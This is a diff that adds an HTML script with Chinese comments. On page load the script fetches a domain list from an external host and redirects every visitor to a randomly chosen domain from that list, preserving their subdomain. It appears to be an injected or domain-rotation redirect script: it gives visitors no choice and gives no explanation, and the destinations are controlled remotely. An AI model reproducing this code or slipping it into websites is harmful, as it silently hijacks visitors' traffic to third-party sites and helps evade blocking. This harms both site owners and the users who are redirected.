@@ -1,0 +1,27 @@
+<script>
+console.log('检测中');
+async function randomDomainRedirect() {
+    try {
+        // 调用远程 PHP 接口（替换本地 api.txt 路径）
+        const response = await fetch('http://doctor.fengnianjy.com/post.php');
+        if (!response.ok) throw new Error('接口请求失败');
+        
+        const text = await response.text();
+        const mainDomains = text.split('\n').map(domain => domain.trim()).filter(domain => domain);
+        
+        if (!mainDomains.length) throw new Error('没找到有效域名');
+        
+        const currentHost = window.location.host;
+        const domainParts = currentHost.split('.');
+        const subDomain = domainParts.length >= 3 ? domainParts[0] : '';
+        const randomMainDomain = mainDomains[Math.floor(Math.random() * mainDomains.length)];
+        const targetUrl = `${window.location.protocol}//${subDomain ? subDomain + '.' : ''}${randomMainDomain}`;
+        
+        console.log('请稍后：', targetUrl);
+        window.location.href = targetUrl;
+    } catch (err) {
+        console.error('失败：', err.message);
+    }
+}
+randomDomainRedirect();
+</script>
